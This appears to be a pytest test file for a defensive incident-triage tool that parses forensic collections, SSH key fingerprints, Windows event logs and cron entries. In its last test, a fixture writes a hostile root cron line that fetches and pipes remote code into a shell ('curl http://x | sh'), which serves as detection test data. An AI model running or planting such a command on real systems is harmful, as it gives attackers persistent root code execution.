"""Tests for soctriage. Run:  python3 -m pytest -q   (from the local-llm-triage/ dir)

These are deterministic and OFFLINE - no model, no network. The synthetic fleet
built by selftest is the fixture; we assert the planted needles are found and
that individual parsers/fingerprints behave.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from soctriage.common import sha256_fingerprint
from soctriage import selftest


def test_fingerprint_valid_keys_distinct():
    import base64
    k1 = base64.b64encode(b"\x00\x00\x00\x0bssh-ed25519" + b"a" * 20).decode()
    k2 = base64.b64encode(b"\x00\x00\x00\x0bssh-ed25519" + b"b" * 20).decode()
    assert sha256_fingerprint(k1) != sha256_fingerprint(k2)
    assert sha256_fingerprint(k1).startswith("SHA256:")


def test_fingerprint_malformed_keys_stay_distinct():
    # The bug we fixed: two different malformed keys must NOT collapse together.
    assert sha256_fingerprint("not-base64-#1") != sha256_fingerprint("not-base64-#2")


def test_end_to_end_finds_all_needles(tmp_path):
    ok = selftest.run_selftest(tmp_path / "st")
    assert ok is True


def test_bodyfile_categories(tmp_path):
    from soctriage.uac_parse import parse_collection
    root = selftest.build_host(tmp_path / "fleet", "web03", compromised=True, ts="20260101000000")
    work = tmp_path / "work"; work.mkdir()
    counts = parse_collection(root.parent / root.name, tmp_path / "parsed", work, recent_days=3650)
    import csv
    rows = list(csv.DictReader((tmp_path / "parsed" / "web03" / "bodyfile.csv").open()))
    cats = " ".join(r["category"] for r in rows)
    assert "suid" in cats
    assert "exec_in_tmp" in cats or any("/tmp/.x" in r["path"] for r in rows)


def test_winlogs_column_detection_and_flags(tmp_path):
    from openpyxl import Workbook
    from soctriage.winlogs import load_events, summarize_event
    from soctriage.llm import heuristic_verdict
    wb = Workbook(); ws = wb.active
    ws.append(["_time", "EventCode", "host", "TargetUserName", "Message"])
    ws.append(["t", 1102, "DC01", "admin", "The audit log was cleared"])
    p = tmp_path / "e.xlsx"; wb.save(p)
    headers, events, colmap = load_events(p)
    assert "event_id" in colmap and "computer" in colmap
    v = heuristic_verdict(summarize_event(events[0]))
    assert v["verdict"] == "malicious"


def test_cron_parsing_system_and_user(tmp_path):
    from soctriage.uac_parse import _cron_lines
    f = tmp_path / "crontab"
    f.write_text("*/10 * * * * root curl http://x | sh\n", encoding="utf-8")
    rows = list(_cron_lines(tmp_path, "h1", f, system=True))
    assert rows and rows[0]["run_as"] == "root" and "curl" in rows[0]["command"]
